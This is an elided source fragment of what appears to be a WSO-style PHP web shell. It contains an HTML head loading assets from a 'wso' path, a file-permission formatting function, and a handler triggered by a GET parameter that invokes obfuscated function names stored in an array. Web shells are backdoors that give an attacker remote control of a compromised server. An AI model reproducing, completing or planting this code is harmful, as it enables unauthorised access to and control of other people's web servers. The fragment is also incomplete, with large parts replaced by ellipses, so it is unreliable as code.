...
<!DOCTYPE html>
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<link rel="icon" href="//ferly-chy.github.io/wso/icon.webp"/>
                        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
			<link rel="stylesheet" href="//ferly-chy.github.io/wso/main.css" type="text/css">

			<script src="https://code.jquery.com/jquery-4.0.0.min.js" integrity="sha256-OaVG6prZf4v69dPg6PhVattBXkcOWQB62pdZ3ORyrao=" crossorigin="anonymous"></script>
                        <script src="https://cdnjs.cloudflare.com/ajax/libs/notify.js/3.0.0/notify.min.js" integrity="sha512-PQMRyb2voatXvVWN0wiKLbGB4U5VSg8xSvdjel7FwiCVquWwNzHs5qmksyZoY+6xPptfMo8m/T/EGVe/8ZxDOw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		</head>
...
<?php
	...
	function x($c): string {
		...
		$u .= ((($x & 0x0100) !== 0) ? "r" : "-");
		$u .= ((($x & 0x0080) !== 0) ? "w" : "-");
		$u .= ((($x & 0x0040) !== 0) ? ((($x & 0x0800) !== 0) ? "s" : "x") : ((($x & 0x0800) !== 0) ? "S" : "-"));
		$u .= ((($x & 0x0020) !== 0) ? "r" : "-");
		$u .= ((($x & 0x0010) !== 0) ? "w" : "-");
		$u .= ((($x & 0x0008) !== 0) ? ((($x & 0x0400) !== 0) ? "s" : "x") : ((($x & 0x0400) !== 0) ? "S" : "-"));
		$u .= ((($x & 0x0004) !== 0) ? "r" : "-");
		$u .= ((($x & 0x0002) !== 0) ? "w" : "-");
		$u .= ((($x & 0x0001) !== 0) ? ((($x & 0x0200) !== 0) ? "t" : "x") : ((($x & 0x0200) !== 0) ? "T" : "-"));
		return $u;
	}
	if(isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
